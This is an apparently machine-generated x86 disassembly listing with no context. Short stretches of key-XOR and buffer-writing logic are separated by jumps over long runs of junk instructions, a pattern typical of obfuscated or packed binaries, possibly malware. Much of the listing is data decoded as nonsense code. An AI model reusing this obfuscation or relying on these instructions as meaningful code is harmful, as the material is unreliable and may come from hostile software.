  402a69:	fiadd  WORD PTR [eax+0x702851aa]
  402a6f:	xchg   ecx,eax
  402a70:	arpl   sp,si
  402a72:	xchg   ebp,eax
  402a73:	or     BYTE PTR [eax],0x2e
  402a76:	jmp    0xa153:0x3d3eea3c
  402a7d:	fs sbb eax,0xf5aa4194
  402a83:	(bad)  
  402a84:	adc    eax,0xc02c3a4d
  402a89:	gs jo  0x402a5f
  402a8c:	cdq    
  402a8d:	push   edi
  402a8e:	mov    cl,0x36
  402a90:	iret   
  402a91:	mov    cs,WORD PTR [eax+0x1139ce05]
  402a97:	sub    edx,edx
  402a99:	addr16 cmp esp,eax
  402a9c:	enter  0x21a3,0xad
  402aa0:	(bad)  
  402aa1:	shrd   DWORD PTR [edx+0x22],esp,0xd0
  402aa6:	dec    esp
  402aa7:	sub    ecx,ebx
  402aa9:	mov    WORD PTR [ebx],?
  402aab:	clc    
  402aac:	add    edi,DWORD PTR [ebp-0x14]
  402aaf:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ab2:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ab9:	mov    dl,BYTE PTR [ebp+0xb]
  402abc:	mov    edi,DWORD PTR [ebp-0x18]
  402abf:	xor    edi,eax
  402ac1:	add    edi,DWORD PTR [ebp-0x14]
  402ac4:	mov    ebx,DWORD PTR [ebp-0x1c]
  402ac7:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  402ace:	mov    edx,DWORD PTR [ebp-0x44]
  402ad1:	mov    edi,DWORD PTR [ebp-0xc]
  402ad4:	xor    edx,eax
  402ad6:	xor    edi,eax
  402ad8:	add    edx,ecx
  402ada:	add    edi,ecx
  402adc:	imul   edx,edi
  402adf:	add    edx,DWORD PTR [ebp-0x14]
  402ae2:	mov    DWORD PTR [ebp-0x14],edx
  402ae5:	mov    edx,DWORD PTR [ebp-0xc]
  402ae8:	mov    edi,DWORD PTR [ebp-0x24]
  402aeb:	xor    edx,eax
  402aed:	add    edx,ecx
  402aef:	jmp    0x402c0f
  402af4:	mov    dl,0x70
  402af6:	mov    bl,0x55
  402af8:	mov    ch,0x55
  402afa:	push   edx
  402afb:	adc    eax,DWORD PTR [edi-0x4070897c]
  402b01:	mov    ds,ebp
  402b03:	xor    bl,BYTE PTR [edx+0x717c7c0d]
  402b09:	jg     0x402b87
  402b0b:	jl     0x402ac0
  402b0d:	mov    BYTE PTR [ebx],al
  402b0f:	lods   eax,DWORD PTR ds:[esi]
  402b10:	adc    DWORD PTR [esi+0x69261bf8],0xffffffb7
  402b17:	or     BYTE PTR [edx-0x4f68c801],dh
  402b1d:	inc    DWORD PTR [eax+eiz*1-0x73]
  402b21:	push   ecx
  402b22:	mov    ah,0xf1
  402b24:	bound  esp,QWORD PTR [esi]
  402b26:	fs dec edx
  402b28:	cmp    BYTE PTR [eax+0x7d2bdc56],bl
  402b2e:	xor    eax,0x83de87cc
  402b33:	mov    ebp,0x214d0a87
  402b38:	sbb    bh,dh
  402b3a:	bound  edx,QWORD PTR [edx]
  402b3c:	and    ebx,esp
  402b3e:	shl    ebx,1
  402b40:	iret   
  402b41:	jno    0x402b85
  402b43:	sub    DWORD PTR [edx],0x65
  402b46:	scas   al,BYTE PTR es:[edi]
  402b47:	shr    DWORD PTR [edi],1
  402b49:	retf   0x6c64
  402b4c:	test   eax,0x26e36a93
  402b51:	or     al,0xdd
  402b53:	and    ebx,DWORD PTR ds:0xeec52e52
  402b59:	pop    eax
  402b5a:	mov    es,ecx
  402b5c:	push   cs
  402b5d:	pop    ds
  402b5e:	jmp    0xcc9f5d5a
  402b63:	scas   al,BYTE PTR es:[edi]
  402b64:	hlt    
  402b65:	sub    al,0x8f
  402b67:	and    ch,BYTE PTR [ecx+0x52]
  402b6a:	repz test al,0xe0
  402b6d:	ret    
  402b6e:	(bad)
  402b73:	cmp    BYTE PTR [edi+0x55],cl
  402b76:	jne    0x402bde
  402b78:	inc    edx
  402b79:	(bad)  
  402b7a:	pop    ss
  402b7b:	sub    eax,0xdb079d54
  402b80:	sub    BYTE PTR [edi],al
  402b82:	cmp    eax,DWORD PTR [eax]
  402b84:	inc    esp
  402b85:	fdivr  QWORD PTR [eax+0x47f348]
  402b8b:	data16 (bad) 
  402b8d:	cmc    
  402b8e:	cwde   
  402b8f:	leave  
  402b90:	mov    ?,WORD PTR [eax]
  402b92:	sbb    ah,BYTE PTR ds:0xc6b88b2
  402b98:	jg     0x402b43
  402b9a:	or     esp,esp
  402b9c:	hlt    
  402b9d:	mov    gs,WORD PTR [edx+0x72]
  402ba0:	pop    es
  402ba1:	jg     0x402b69
  402ba3:	and    esp,DWORD PTR [ebx+esi*4]
  402ba6:	mov    BYTE PTR [ebx+0x3e],al
  402ba9:	add    eax,0x6b282404
  402bae:	or     al,0x5c
  402bb0:	inc    ecx
  402bb1:	clc    
  402bb2:	mov    eax,0xbe0d1930
  402bb7:	les    esp,FWORD PTR [edi-0x5a01f6a3]
  402bbd:	jnp    0x402ba6
  402bbf:	xchg   esp,eax
  402bc0:	dec    esi
  402bc1:	pop    edi
  402bc2:	and    al,0x87
  402bc4:	nop    DWORD PTR [ecx-0x30ef3052]
  402bcb:	jns    0x402c39
  402bcd:	rol    bl,1
  402bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bd0:	mov    ch,0x7f
  402bd2:	inc    edx
  402bd3:	data16 cmp ch,BYTE PTR [ecx+edi*1]
  402bd7:	sbb    ah,cl
  402bd9:	int    0xf9
  402bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bdd:	jne    0x402b97
  402bdf:	or     DWORD PTR [ebx],edi
  402be1:	mov    ebp,DWORD PTR [edx-0x47f56c29]
  402be7:	mov    al,ds:0xbb3c159
  402bec:	les    edx,FWORD PTR [ebp-0x5ef770d3]
  402bf2:	test   DWORD PTR fs:[edx],esp
  402bf5:	loop   0x402c10
  402bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bf8:	cmp    bh,BYTE PTR [edx-0x66]
  402bfb:	mov    ch,0x8d
  402bfd:	int3   
  402bfe:	sti    
  402bff:	sbb    ecx,DWORD PTR [ebx-0x49]
  402c02:	sbb    bh,dl
  402c04:	int    0xd7
  402c06:	test   eax,0x88f405d
  402c0b:	sub    eax,0xf258a6d
  402c10:	scas   eax,DWORD PTR es:[edi]
  402c11:	xlat   BYTE PTR ds:[ebx]
  402c12:	mov    edi,DWORD PTR [ebp-0xc]
  402c15:	xor    edi,eax
  402c17:	sub    edx,edi
  402c19:	mov    edi,DWORD PTR [ebp-0xc]
  402c1c:	mov    ebx,DWORD PTR [ebp-0x14]
  402c1f:	xor    edi,eax
  402c21:	add    edi,ecx
  402c23:	imul   edi,ebx
  402c26:	mov    ebx,DWORD PTR [ebp-0x18]
  402c29:	xor    ebx,eax
  402c2b:	sub    edx,ecx
  402c2d:	lea    edi,[edi+ebx*1+0x32729e]
  402c34:	cmp    edi,edx
  402c36:	jbe    0x40295a
  402c3c:	mov    edx,DWORD PTR [ebp-0xc]
  402c3f:	mov    edi,DWORD PTR [ebp-0x24]
  402c42:	xor    edx,eax
  402c44:	add    edx,ecx
  402c46:	imul   edx,edi
  402c49:	mov    edi,DWORD PTR [ebp-0x18]
  402c4c:	xor    edi,eax
  402c4e:	add    edx,edi
  402c50:	mov    edi,DWORD PTR [ebp-0x8]
  402c53:	lea    edx,[edx+edi*1+0x32729e]
  402c5a:	mov    DWORD PTR [ebp-0x8],edx
  402c5d:	mov    edx,DWORD PTR [ebp-0x20]
  402c60:	xor    edx,eax
  402c62:	mov    edi,0xffcd8d62
  402c67:	sub    edi,edx
  402c69:	add    edi,DWORD PTR [ebp-0x10]
  402c6c:	mov    edx,DWORD PTR [ebp-0x20]
  402c6f:	mov    ebx,DWORD PTR [ebp-0x8]
  402c72:	xor    edx,eax
  402c74:	add    edx,ecx
  402c76:	imul   edx,ebx
  402c79:	cmp    edx,edi
  402c7b:	jbe    0x40217b
  402c81:	pop    ebx
  402c82:	pop    edi
  402c83:	leave  
  402c84:	ret    0x8
  402c87:	push   ebp
  402c88:	mov    ebp,esp
  402c8a:	jmp    0x402d8c
  402c8f:	test   al,0x6e
  402c91:	iret   
  402c92:	clc    
  402c93:	fnstsw WORD PTR [ebp-0x55]
  402c96:	outs   dx,BYTE PTR ds:[esi]
  402c97:	ret    
  402c98:	popf   
  402c99:	aam    0x5e
  402c9b:	sbb    eax,0x9f6e16c8
  402ca0:	or     al,0x7c
  402ca2:	jl     0x402cf7
  402ca4:	jl     0x402d22
  402ca6:	jl     0x402c9e
  402ca8:	jo     0x402c75
  402caa:	idiv   DWORD PTR [ebx]
  402cac:	div    BYTE PTR [esi-0x646af14]
  402cb2:	xchg   ebp,eax
  402cb3:	popa   
  402cb4:	or     edi,DWORD PTR [eax]
  402cb6:	(bad)  
  402cb7:	xchg   ebx,eax
  402cb8:	mov    ecx,0xb99eddbf
  402cbd:	push   ebp
  402cbe:	in     eax,dx
  402cbf:	adc    ch,BYTE PTR [ebx+0x5e52238b]
  402cc5:	jmp    0x79e6468e
  402cca:	test   BYTE PTR [eax],cl
  402ccc:	and    eax,0x60765f0f
  402cd1:	push   ebx
  402cd2:	inc    esi
  402cd3:	add    al,0x36
  402cd5:	inc    ebp
  402cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cd7:	test   eax,0x437bbd12
  402cdc:	or     DWORD PTR [ecx-0x12826d30],ebp
  402ce2:	outs   dx,BYTE PTR ds:[esi]
  402ce3:	add    ebp,DWORD PTR [edi]
  402ce5:	pusha  
  402ce6:	shr    DWORD PTR [ebp-0x3d1b9156],0x4e
  402ced:	pusha  
  402cee:	repz dec esi
  402cf0:	sub    cl,BYTE PTR [esi]
  402cf2:	cs push eax
  402cf4:	ss sbb al,0xe3
  402cf7:	iret   
  402cf8:	pop    esp
  402cf9:	adc    ah,BYTE PTR [eax+0x64b8e43d]
  402cff:	scas   al,BYTE PTR es:[edi]
  402d00:	jae    0x402d4c
  402d02:	hlt    
  402d03:	xor    al,0x45
  402d05:	mov    ecx,0xcdea811b
  402d0a:	aas    
  402d0b:	ds repnz scas al,BYTE PTR es:[edi]
  402d0e:	xchg   ebp,eax
  402d0f:	fwait
  402d10:	or     ecx,esi
  402d12:	mov    ebx,0xf4741443
  402d17:	test   DWORD PTR [ecx+0x65],ebp
  402d1a:	add    esi,DWORD PTR [ebx]
  402d1c:	or     dl,BYTE PTR [ebx+0x7]
  402d1f:	in     eax,dx
  402d20:	jno    0x402d2c
  402d22:	outs   dx,BYTE PTR ds:[esi]
  402d23:	fild   QWORD PTR [esi-0x77]
  402d26:	mov    al,ds:0xc5e632b0
  402d2b:	das    
  402d2c:	pusha  
  402d2d:	and    eax,0xbee8c497
  402d32:	xchg   ecx,eax
  402d33:	fdivr  DWORD PTR [edx+0x2a]
  402d36:	xor    edi,0xffffffda
  402d39:	in     al,0x1e
  402d3b:	push   ds
  402d3c:	addr16 ret 0xa35f
  402d40:	mul    DWORD PTR [esi]
  402d42:	pop    esi
  402d43:	mov    ecx,0xdfc60aad
  402d48:	jmp    FWORD PTR [ebp+0x65]
  402d4b:	xchg   ecx,eax
  402d4c:	add    DWORD PTR [esi-0x642b687b],ebx
  402d52:	and    ch,BYTE PTR [edi+0xd8da8cf]
  402d58:	lds    esp,FWORD PTR [eax+0x155dbf00]
  402d5e:	mov    ebx,0xfa7ea9c3
  402d63:	getsec 
  402d65:	cwde   
  402d66:	shr    ah,1
  402d68:	pop    esp
  402d69:	or     edx,esi
  402d6b:	mov    esi,0x2fbeb9a0
  402d70:	popa   
  402d71:	jmp    0x644a:0xcffddb5c
  402d78:	iret   
  402d79:	es add eax,0x6d11dc82
  402d7f:	sbb    edi,DWORD PTR [eax-0x5268cc24]
  402d85:	xchg   ebp,esi
  402d87:	push   edi
  402d88:	jno    0x402dc8
  402d8a:	sbb    esi,edi
  402d8c:	push   ecx
  402d8d:	and    edx,DWORD PTR ds:0x4275a8
  402d93:	push   ecx
  402d94:	and    DWORD PTR ds:0x427d1f,edi
  402d9a:	mov    eax,0xf89c8535
  402d9f:	mov    ecx,DWORD PTR ds:0x4278ab
  402da5:	mov    ecx,DWORD PTR [ecx]
  402da7:	xor    DWORD PTR ds:0x42c89a,ecx
  402dad:	mov    DWORD PTR [ebp-0x8],eax
  402db0:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402db7:	jmp    0x402eb9
  402dbc:	aas    
  402dbd:	enter  0x7aef,0xfb
  402dc1:	jge    0x402e10
  402dc3:	jge    0x402db3
  402dc5:	int    0x4c
  402dc7:	jae    0x402da7
  402dc9:	scas   al,BYTE PTR es:[edi]
  402dca:	inc    ebx
  402dcb:	or     eax,0x7c7c0ff2
  402dd0:	push   ebx
  402dd1:	jl     0x402e4f
  402dd3:	jl     0x402de7
  402dd5:	call   0xf36:0xcc7245f6
  402ddc:	scas   eax,DWORD PTR es:[edi]
  402ddd:	(bad)  
  402dde:	stos   DWORD PTR es:[edi],eax
  402ddf:	jb     0x402de3
  402de1:	cmp    dl,al
  402de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de4:	frstor [ebx]
  402de6:	jge    0x402da0
  402de8:	or     al,0x77
  402dea:	sbb    ebx,DWORD PTR [edx+0x4208bdd5]
  402df0:	xor    esi,DWORD PTR [ebx+0x20]
  402df3:	stos   DWORD PTR es:[edi],eax
  402df4:	imul   esi,DWORD PTR [esp+eiz*4],0x1a
  402df8:	adc    DWORD PTR [edx],esp
  402dfa:	dec    eax
  402dfb:	int3   
  402dfc:	adc    dh,dh
  402dfe:	jecxz  0x402e51
  402e00:	push   ecx
  402e01:	cld    
  402e02:	dec    ebx
  402e03:	mov    WORD PTR [ebx],gs
  402e05:	sub    eax,0x88ef9364
  402e0a:	add    al,BYTE PTR [edi]
  402e0c:	loopne 0x402e81
  402e0e:	enter  0xf5c3,0x40
  402e12:	add    BYTE PTR [ebp+ebx*8+0x1c],bl
  402e16:	stc    
  402e17:	xor    DWORD PTR [ebx+0x21],0xfffffffd
  402e1b:	fnstenv [esi]
  402e1d:	int    0x2a
  402e1f:	cdq    
  402e20:	adc    edx,DWORD PTR [edi]
  402e22:	pop    edi
  402e23:	or     al,0x8d
  402e25:	sub    ebx,DWORD PTR [ebx+0x18a7d38f]
  402e2b:	aas    
  402e2c:	cmc    
  402e2d:	jle    0x402e0e
  402e2f:	cwde   
  402e30:	mov    ecx,0xaa75f887
  402e35:	adc    eax,0x6e3486b5
  402e3a:	mov    ah,0xf7
  402e3c:	mov    eax,ds:0x4d9e28ab
  402e41:	lds    ebp,FWORD PTR [ecx+0x47e7c76a]
  402e47:	cmp    DWORD PTR [ebp-0x47ac683f],edx
  402e4d:	jmp    0xbed3:0xac33b170
  402e54:	mov    dl,BYTE PTR [esi+eax*2+0x8370737]
  402e5b:	test   al,0xe
  402e5d:	mov    ds:0x94f08295,eax
  402e62:	sub    ebx,DWORD PTR [edx+0x221ca78c]
  402e68:	add    edx,DWORD PTR [esi]
  402e6a:	ret    
  402e6b:	out    0xea,al
  402e6d:	rol    DWORD PTR [edi],1
  402e6f:	leave  
  402e70:	adc    esp,eax
  402e72:	test   eax,0xee0b310a
  402e77:	retf   
  402e78:	pop    ebp
  402e79:	xor    DWORD PTR [esi],0xffffff80
  402e7c:	ins    BYTE PTR es:[edi],dx
  402e7d:	jp     0x402e52
  402e7f:	mov    al,ds:0xe641963
  402e84:	xchg   esi,eax
  402e85:	jno    0x402ee7
  402e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e88:	and    cl,BYTE PTR [edx+eax*1]
  402e8b:	xchg   ebx,eax
  402e8c:	and    al,0x35
  402e8e:	xor    al,0xbf
  402e91:	ins    DWORD PTR es:[edi],dx
  402e92:	fwait
  402e93:	int3   
  402e94:	xchg   edx,eax
  402e95:	arpl   WORD PTR [ebx],sp
  402e97:	clc    
  402e98:	mov    esi,0xa49a753f
  402e9d:	lods   al,BYTE PTR ds:[esi]
  402e9e:	dec    BYTE PTR [esi+ebp*8]
  402ea1:	(bad)  
  402ea2:	sbb    bh,bl
  402ea4:	pop    ds
  402ea5:	cmp    esp,DWORD PTR [ecx+0x29efad72]
  402eab:	lods   eax,DWORD PTR ds:[esi]
  402eac:	pop    ss
  402ead:	dec    ecx
  402eae:	test   al,0x88
  402eb0:	scas   al,BYTE PTR es:[edi]
  402eb1:	add    BYTE PTR [ebx],ah
  402eb3:	cmp    esi,DWORD PTR [ebp-0x3a3d0c36]
  402eb9:	mov    edx,DWORD PTR [ebp-0x8]
  402ebc:	neg    DWORD PTR ds:0x4275a0
  402ec2:	push   esi
  402ec3:	jmp    0x402fc5
  402ec8:	xor    BYTE PTR [eax-0x3f],cl
  402ecb:	aaa    
  402ecc:	pop    ecx
  402ecd:	pop    ebp
  402ece:	fimul  DWORD PTR [ebx+0xf]
  402ed1:	mov    eax,ds:0x474b860b
  402ed6:	icebp  
  402ed7:	sti    
  402ed8:	jmp    0x53bcaaeb
  402edd:	jl     0x402f5b
  402edf:	jl     0x402eb4
  402ee1:	push   ecx
  402ee2:	and    al,0xe
  402ee4:	jmp    0xd82b219e
  402ee9:	pop    es
  402eea:	mov    edi,0xabeb685c
  402eef:	jmp    0x402f13
  402ef1:	int3   
  402ef2:	ret    0x1e7e
  402ef5:	sbb    dh,BYTE PTR [edi-0x7c3ecd7e]
  402efb:	mov    esp,0xc553183a
  402f00:	push   esp
  402f01:	fldenv [ecx+0x17]
  402f04:	ds imul eax,DWORD PTR ss:[ecx+0x5],0xe88bcb5a
  402f0d:	push   ebp
  402f0e:	mov    bh,0x86
  402f10:	mov    ebx,0x29fba05b
  402f15:	(bad)  
  402f16:	cli    
  402f17:	cmp    al,0x88
  402f19:	fild   QWORD PTR [ebx]
  402f1b:	idiv   BYTE PTR [edx+eax*2]
  402f1e:	push   edx
  402f1f:	scas   eax,DWORD PTR es:[edi]
  402f20:	adc    al,0x23
  402f22:	jo     0x402f1c
  402f24:	sub    al,0xec
  402f26:	jecxz  0x402edb
  402f28:	jbe    0x402f63
  402f2a:	fist   WORD PTR [ecx-0x58]
  402f2d:	popf   
  402f2e:	fwait
  402f2f:	jae    0x402f6f
  402f31:	or     esi,DWORD PTR [ecx]
  402f33:	call   0xa780:0x6160b210
  402f3a:	inc    ebx
  402f3b:	cmp    al,BYTE PTR [ecx]
  402f3d:	shl    BYTE PTR [ecx+0x744906cf],1
  402f43:	imul   esi,DWORD PTR [ebp-0x6b],0xcbf2b64f
  402f4a:	xor    esi,DWORD PTR [eax]
  402f4c:	sbb    esp,DWORD PTR [edi]
  402f4e:	inc    ebx
  402f4f:	or     eax,0xf6ef88b2
  402f54:	xchg   BYTE PTR [ecx+0x12],dl
  402f57:	retf   0x71ba
  402f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f5b:	pushf  
  402f5c:	call   0x8243:0x5991c741
  402f63:	ds into 
  402f65:	mov    bl,0x53
  402f67:	shr    DWORD PTR [edi+0xae9407c],cl
  402f6d:	adc    DWORD PTR cs:[esi],edi
  402f70:	mov    al,0x2a
  402f72:	ins    BYTE PTR es:[edi],dx
  402f73:	stc    
  402f74:	ror    bl,1
  402f76:	leave  
  402f77:	pushf  
  402f78:	iret   
  402f79:	minps  xmm2,XMMWORD PTR [esi+edi*1+0x65a2fdef]
  402f81:	sbb    al,0x77
  402f83:	jge    0x402f3c
  402f85:	mov    dh,0x62
  402f87:	mov    DWORD PTR [eax-0x5093307f],eax
  402f8d:	sub    DWORD PTR [ebx+esi*8+0x1d],ebp
  402f91:	xchg   ebp,eax
  402f92:	outs   dx,DWORD PTR ds:[esi]
  402f93:	enter  0x5631,0x70
  402f97:	scas   eax,DWORD PTR es:[edi]
  402f98:	pop    ebp
  402f99:	add    dl,BYTE PTR ds:0x44ac6343
  402f9f:	or     eax,ebx
  402fa1:	cmp    eax,0x1284cb59
  402fa6:	ficom  DWORD PTR [edi-0x3f2e48be]
  402fac:	mov    ds:0x4131caf9,eax
  402fb1:	cmp    bl,BYTE PTR [edi+0x5819d80b]
  402fb7:	push   0x96be8b2e
  402fbc:	mul    BYTE PTR [ecx+0x2251802]
  402fc2:	add    BYTE PTR [edx+0x857b9fd],bl
  402fc8:	push   ecx
  402fc9:	pop    es
  402fca:	jmp    0x4030cc
  402fcf:	xlat   BYTE PTR ds:[ebx]
  402fd0:	push   ebp
  402fd1:	imul   ebp,DWORD PTR [eax+0x6d],0xe255ed68
  402fd8:	xor    ecx,DWORD PTR [ecx]
  402fda:	xchg   edx,eax
  402fdb:	jbe    0x402fe6
  402fdd:	lock out dx,al
  402fdf:	int3   
  402fe0:	add    DWORD PTR [esp+edi*2+0x53],edi
  402fe4:	jl     0x403062
  402fe6:	jl     0x402ff5
  402fe8:	mul    dh
  402fea:	push   ss
  402feb:	add    BYTE PTR [edi+edi*2],bl
  402fee:	mov    bh,0xc0
  402ff0:	imul   BYTE PTR fs:[edi-0x68]
  402ff4:	cmp    ch,BYTE PTR [edx]
  402ff6:	pushf  
  402ff7:	shl    DWORD PTR [eax-0x3342b5b1],1
  402ffd:	mov    ecx,0xf0a0bf3d
  403002:	repz adc al,0xb5
  403005:	jns    0x402fb0
  403007:	inc    DWORD PTR [ebp-0x43da04eb]
  40300d:	aaa    
  40300e:	adc    DWORD PTR [eax+0x7f],edi
  403011:	pop    esi
  403012:	lahf   
  403013:	rol    DWORD PTR [ecx],0x6c
  403016:	jg     0x403013
  403018:	pop    edx
  403019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40301a:	stos   DWORD PTR es:[edi],eax
  40301b:	and    BYTE PTR [ecx-0x51],dh
  40301e:	test   BYTE PTR [edi-0x74],ah
  403021:	adc    al,0x63
  403023:	or     BYTE PTR [edi],al
  403025:	cmp    al,0x54
  403027:	test   ebx,0x6f421291
  40302d:	sub    al,0x21
  40302f:	sub    DWORD PTR [ebx+esi*2-0x12c40b35],eax
  403036:	je     0x402fdb
  403038:	mov    ch,0xf
  40303a:	add    edi,0xcf2d914f
  403040:	jmp    0x689b:0x5ef58483
  403047:	inc    edi
  403048:	pop    eax
  403049:	nop
  40304a:	push   ebp
  40304b:	lahf   
  40304c:	or     DWORD PTR [edx-0x25],esp
  40304f:	bnd ret 0x826d
  403053:	inc    edi
  403054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403055:	rol    ch,1
  403057:	nop
  403058:	add    BYTE PTR [edi+edx*1],0x67
  40305c:	jle    0x403065
  40305e:	mov    edi,0x55486d6b
  403063:	mov    ch,0x2
  403065:	xor    al,BYTE PTR [edi+0x753047ba]
  40306b:	scas   al,BYTE PTR es:[edi]
  40306c:	imul   ebx,DWORD PTR [eax-0x1],0x2
  403070:	adc    eax,0xc3e61cd3
  403075:	scas   eax,DWORD PTR es:[edi]
  403076:	ss (bad) 
  403078:	fldcw  WORD PTR [ebx+0x65]
  40307b:	je     0x403059
  40307d:	ja     0x40307c
  40307f:	test   BYTE PTR [ecx-0x47],dl
  403082:	pop    ss
  403083:	sub    DWORD PTR [edx+ebx*1-0x3675e3b8],edx
  40308a:	lea    ecx,[ebp-0x1b]
  40308d:	into   
  40308e:	push   ds
  40308f:	mov    ds:0xc3b09282,al
  403094:	sbb    al,0xf8
  403096:	das    
  403097:	fwait
  403098:	inc    ebp
  403099:	inc    eax
  40309a:	and    DWORD PTR [ebp+0x3d],esi
  40309d:	xor    ch,BYTE PTR [eax-0x4c150cd4]
  4030a3:	ds xor al,0xb9
  4030a6:	sti    
  4030a7:	aaa    
  4030a8:	push   edi
  4030a9:	add    DWORD PTR [esi-0x4f88a966],esi
  4030af:	cmp    BYTE PTR [ebx+0x71],al
  4030b2:	imul   dh
  4030b4:	mov    WORD PTR [esi],es
  4030b6:	cmp    bh,BYTE PTR [eax+ecx*8-0x7ca022b6]
  4030bd:	outs   dx,DWORD PTR ds:[esi]
  4030be:	hlt    
  4030bf:	mov    esi,0xa2c88492
  4030c4:	gs push cs
  4030c6:	clc    
  4030c7:	add    DWORD PTR [esi+0x33e958c5],ecx
  4030cd:	ror    DWORD PTR [ebx+0x4292a535],1
  4030d3:	add    BYTE PTR [ecx],cl
  4030d5:	xor    eax,0x4275a8
  4030da:	mov    esi,0x32729e
  4030df:	push   edi
  4030e0:	mov    edi,DWORD PTR [ebp+0x10]
  4030e3:	sub    DWORD PTR ds:0x42c88e,0x427d17
  4030ed:	add    edx,esi
  4030ef:	cmp    edi,edx
  4030f1:	jmp    0x4031f3
  4030f6:	in     eax,0x90
  4030f8:	ds std 
  4030fa:	inc    ecx
  4030fb:	jge    0x4030fa
  4030fd:	test   al,0xb1
  4030ff:	test   BYTE PTR [ebx],0x86
  403102:	loope  0x4030ff
  403104:	ss jl  0x40312a
  403107:	add    BYTE PTR [esp+edi*2+0x53],bh
  40310b:	jl     0x403189
  40310d:	jl     0x403111
  40310f:	sub    dl,BYTE PTR [edx-0x55]
  403112:	and    al,0x32
  403114:	into   
  403115:	cmp    eax,0xe00aee47
  40311a:	std    
  40311b:	mov    eax,ds:0x110eab4f
  403120:	mov    bl,0xd7
  403122:	(bad)  
  403123:	sbb    al,0x44
  403125:	push   esi
  403126:	xlat   BYTE PTR ds:[ebx]
  403127:	cmc    
  403128:	(bad)  
  403129:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40312b:	arpl   sp,di
  40312d:	xchg   BYTE PTR [esi+0x5620c35],dh
  403133:	mov    DWORD PTR [edi+0x732eaa78],esi
  403139:	push   edx
  40313a:	pop    ebx
  40313b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40313c:	scas   eax,DWORD PTR es:[edi]
  40313d:	js     0x4031b6
  40313f:	in     al,0xab
  403141:	nop
  403142:	dec    edx
  403143:	inc    ebx
  403144:	sahf   
  403145:	sub    al,0xc
  403147:	out    0xe1,eax
  403149:	test   DWORD PTR [edi],0x507df197
  40314f:	jecxz  0x403152
  403151:	pushf  
  403152:	imul   edx,DWORD PTR [esi],0xe28e3047
  403158:	stos   BYTE PTR es:[edi],al
  403159:	mov    BYTE PTR [esp+ebp*4+0x18],ch
  40315d:	pop    ebx
  40315e:	jno    0x4030e2
  403160:	sti    
  403161:	sti    
  403162:	inc    esp
  403163:	lea    ebx,[ebx]
  403165:	dec    esi
  403166:	retf   0xda52
  403169:	(bad)  
  40316a:	adc    eax,0x60011115
  40316f:	into   
  403170:	cmp    eax,0xbefa2626
  403175:	sbb    DWORD PTR [eax],0x478a81bb
  40317b:	lods   al,BYTE PTR ds:[esi]
  40317c:	fs je  0x403174
  40317f:	inc    edx
  403180:	jmp    0x2440:0x72de1067
  403187:	leave  
  403188:	jnp    0x40310a
  40318a:	fmul   QWORD PTR [eax+0x2ca9dcbc]
  403190:	ja     0x403190
  403192:	ins    DWORD PTR es:[edi],dx
  403193:	adc    cl,BYTE PTR [edx-0x5e]
  403196:	stos   BYTE PTR es:[edi],al
  403197:	sbb    edi,0xffffffe8
  40319a:	xchg   ebp,eax
  40319b:	pop    esi
  40319c:	(bad)  
  40319d:	retf   
  40319e:	pop    es
  40319f:	adc    DWORD PTR [ebx-0x200e79f6],eax
  4031a5:	push   ecx
  4031a6:	and    eax,0x599e56f2
  4031ab:	cmp    eax,0xc2de559b
  4031b0:	jmp    0xd2f87df6
  4031b5:	fild   WORD PTR [esi]
  4031b7:	jp     0x40317c
  4031b9:	cmp    DWORD PTR [ebx+0x61],edx
  4031bc:	cdq    
  4031bd:	out    0x77,eax
  4031bf:	mov    ebx,0x764021e9
  4031c4:	inc    ebp
  4031c5:	mov    eax,ds:0x8e49e587
  4031ca:	rcl    ecx,1
  4031cc:	push   0xffffff8a
  4031ce:	xchg   esi,eax
  4031cf:	jmp    0x3727:0xdeaf0cf
  4031d6:	xor    al,0x9c
  4031d8:	inc    ebp
  4031d9:	inc    edx
  4031da:	inc    esi
  4031db:	or     ah,ah
  4031dd:	inc    ecx
  4031de:	mov    eax,ds:0xad97ae7
  4031e3:	cvtpi2ps xmm3,QWORD PTR [edx+0xa]
  4031e7:	sub    ebx,ebx
  4031e9:	sti    
  4031ea:	adc    eax,0xf1347dac
  4031ef:	jo     0x4031eb
  4031f1:	xor    al,0x6c
  4031f3:	je     0x4034f0
  4031f9:	adc    edi,DWORD PTR ds:0x4292c1
  4031ff:	mov    edx,DWORD PTR [ebp-0x8]
  403202:	mov    eax,DWORD PTR [ebp-0x4]
  403205:	xor    eax,ecx
  403207:	and    DWORD PTR ds:0x4275a0,0x0
  403211:	jmp    0x403223
  403216:	mov    edi,DWORD PTR ds:0x4275a0
  40321c:	inc    edi
  40321d:	mov    DWORD PTR ds:0x4275a0,edi
  403223:	cmp    DWORD PTR ds:0x4275a0,0x1e
  40322a:	jae    0x40326d
  403230:	cmp    DWORD PTR ds:0x4275a0,0xa
  403237:	jne    0x403248
  40323d:	push   0x444a
  403242:	call   DWORD PTR ds:0x4279cb
  403248:	cmp    DWORD PTR ds:0x4275a0,0x9
  40324f:	jne    0x403262
  403255:	mov    edi,DWORD PTR ds:0x4275a0
  40325b:	inc    edi
  40325c:	mov    DWORD PTR ds:0x4275a0,edi
  403262:	jmp    0x403216
  403267:	or     DWORD PTR ds:0x427d0b,ecx
  40326d:	mov    edi,0xffcd8d62
  403272:	sub    edi,eax
  403274:	add    edi,DWORD PTR [ebp+0x10]
  403277:	or     DWORD PTR ds:0x427d07,0x4292a9
  403281:	xor    edx,ecx
  403283:	jmp    0x403385
  403288:	mov    DWORD PTR [edx-0x34],edi
  40328b:	dec    ebp
  40328c:	jecxz  0x4032fb
  40328e:	popf   
